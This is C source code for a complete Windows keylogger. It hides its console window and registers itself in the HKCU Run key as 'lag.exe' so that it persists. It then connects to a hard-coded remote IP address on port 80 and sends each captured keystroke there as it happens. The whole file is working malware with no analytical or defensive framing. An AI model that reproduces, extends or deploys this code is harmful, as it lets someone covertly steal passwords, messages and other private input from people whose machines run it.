#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <string.h>
#include <winuser.h>
#include <winreg.h>
#define max_path 264

const int isCaplock(){
    return (GetKeyState(VK_CAPITAL) & 0x0001);      //check caplock co bat k
}
const int isShiftlock(){
    return (GetKeyState(VK_SHIFT) < 0);             //check shift co bi de k (<0)
}

char key[20];
char *get_key(DWORD keyy){
    memset(key, 0, sizeof(key));
    if(keyy >= 65 && keyy <=90){
        if(isCaplock() && isShiftlock())
            sprintf(key,"%c", (char)(keyy + 32));
        else if(!isCaplock() && !isShiftlock())
            sprintf(key,"%c", (char)(keyy + 32));
        else
            sprintf(key,"%c", (char)keyy);
    }
    else if(keyy >= 48 && keyy <=57){
        char number[]={'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
        char sh_number[]={')', '!', '@', '#', '$', '%', '^', '&', '*', '('};
        if(isShiftlock()){
            sprintf(key, "%c", sh_number[keyy-48]);
        }
        else
            sprintf(key, "%c", number[keyy-48]);
    }
    else if(keyy >= VK_LBUTTON && keyy <= 7)
        sprintf(key, "%c", NULL);
    else if(keyy >= VK_NUMPAD0 && keyy <= VK_NUMPAD9){
        char number[]={'0', '1', '2', '3', '4', '5', '6', '7', '8', '9'};
        sprintf(key, "%c", number[keyy-VK_NUMPAD0]);
    }
    else if(keyy >= VK_MULTIPLY && keyy <= VK_DIVIDE){
        char math[]={'*', '+', '.', '-', '/'};
        if(keyy == VK_SEPARATOR)
            sprintf(key, "%s", "[VK_SEPARATOR]");
        else
            sprintf(key, "%s", math[keyy-VK_MULTIPLY]);
    }
    else if(keyy >= VK_F1 && keyy <= VK_F12){
        char *fkey[]={"[F1]", "[F2]", "[F3]", "[F4]", "[F5]", "[F6]", "[F7]", "[F8]", "[F9]", "[F10]", "[F11]", "[F12]"};
        sprintf(key, "%s", fkey[keyy-VK_F1]);
    }
    else if(keyy == VK_BACK)
        sprintf(key, "%s", "[BSP]");
    else if(keyy == VK_TAB)
        sprintf(key, "%s", "    ");
    else if(keyy == VK_SPACE)
        sprintf(key, "%s", " ");
    else if(keyy == VK_RETURN)
        sprintf(key, "%s", "\n");
    else if(keyy == VK_UP)
        sprintf(key, "%s", "[UP]");
    else if(keyy == VK_DOWN)
        sprintf(key,"%s", "[DOWN]");
    else if(keyy == VK_LEFT)
        sprintf(key, "%s", "[LEFT]");
    else if(keyy == VK_RIGHT)
        sprintf(key, "%s", "[RIGHT]");
    else if(keyy == VK_SNAPSHOT)
        sprintf(key, "%s", "[PRTSCR]");
    else if(keyy == VK_OEM_MINUS){
        if(isShiftlock())
            sprintf(key, "%s", "_");
        else
            sprintf(key, "%s", "-");
    }
    else if(keyy == VK_OEM_PLUS){
        if(isShiftlock())
            sprintf(key, "%s", "+");
        else
            sprintf(key, "%s", "=");
    }
    else if(keyy == VK_OEM_4){
        if(isShiftlock())
            sprintf(key, "%s", "{");
        else
            sprintf(key, "%s", "[");
    }
    else if(keyy == VK_OEM_6){
        if(isShiftlock())
            sprintf(key, "%s", "}");
        else
            sprintf(key, "%s", "]");
    }
    else if(keyy == VK_OEM_5){
        if(isShiftlock())
            sprintf(key, "%s", "|");
        else
            sprintf(key, "%s", "\\");
    }
    else if(keyy == VK_OEM_1){
        if(isShiftlock())
            sprintf(key, "%s", ":");
        else
            sprintf(key, "%s", ";");
    }
    else if(keyy == VK_OEM_7){
        if(isShiftlock())
            sprintf(key, "%s", "\"");
        else
            sprintf(key, "%s", "'");
    }
    else if(keyy == VK_OEM_COMMA){
        if(isShiftlock())
            sprintf(key, "%s", "<");
        else
            sprintf(key, "%s", ",");
    }
    else if(keyy == VK_OEM_PERIOD){
        if(isShiftlock())
            sprintf(key, "%s", ">");
        else
            sprintf(key, "%s", ".");
    }
    else if(keyy == VK_OEM_2){
        if(isShiftlock())
            sprintf(key, "%s", "?");
        else
            sprintf(key, "%s", "/");
    }
    else 
        sprintf(key, "%c", NULL);

    return key;
}



int main(int argc, char *argv[]){ 
    char szPath[max_path];
    GetModuleFileName(NULL, szPath, max_path);
    ShowWindow(GetConsoleWindow(), SW_HIDE); 
    HKEY newvalue;
    if(!RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 0x20006, &newvalue)){
        RegSetValueEx(newvalue, "lag.exe", 0, REG_SZ, (BYTE*)szPath, strlen(szPath));
    }
    else{
        MessageBox(NULL, "Error", "Error", MB_OK);
        return 0;
    }
    printf("---TCP Client---\n");
    WSADATA data;
    int iwsastart = WSAStartup(MAKEWORD(2,2), &data);
    if(iwsastart != 0){
        printf("WSAStartup failed with error: %d\n", iwsastart);
        return 1;
    }
    SOCKET TCPclient = socket (AF_INET, SOCK_STREAM, IPPROTO_TCP);  
    if(TCPclient == INVALID_SOCKET){
        printf("socket() failed with error: %d\n", WSAGetLastError());
        WSACleanup();
        return 1;
    }
    struct sockaddr_in TCPserver;
    TCPserver.sin_family = AF_INET;
    TCPserver.sin_addr.s_addr = inet_addr("54.77.139.23");
    TCPserver.sin_port = htons(80);

    int iConnect = connect(TCPclient, (SOCKADDR *)&TCPserver, sizeof(TCPserver));
    if(iConnect == SOCKET_ERROR){
        printf("connect() failed with error: %d\n", WSAGetLastError());
        closesocket(TCPclient);
        WSACleanup();
        return 1;
    }   
    
    printf("Connected to server...\n");
    printf("Client is ready to send data...\n");

    while(1){
        for(DWORD i=0; i<255; i++){        
            if(GetAsyncKeyState(i) == -32767){
                printf("%s", get_key(i));
                int isend = send(TCPclient, get_key(i), strlen(get_key(i)), 0);  
                if(isend == SOCKET_ERROR){
                    printf("send() failed with error: %d\n", WSAGetLastError());
                    closesocket(TCPclient);
                    WSACleanup();
                    return 1;
                }
            }
        }
    }
}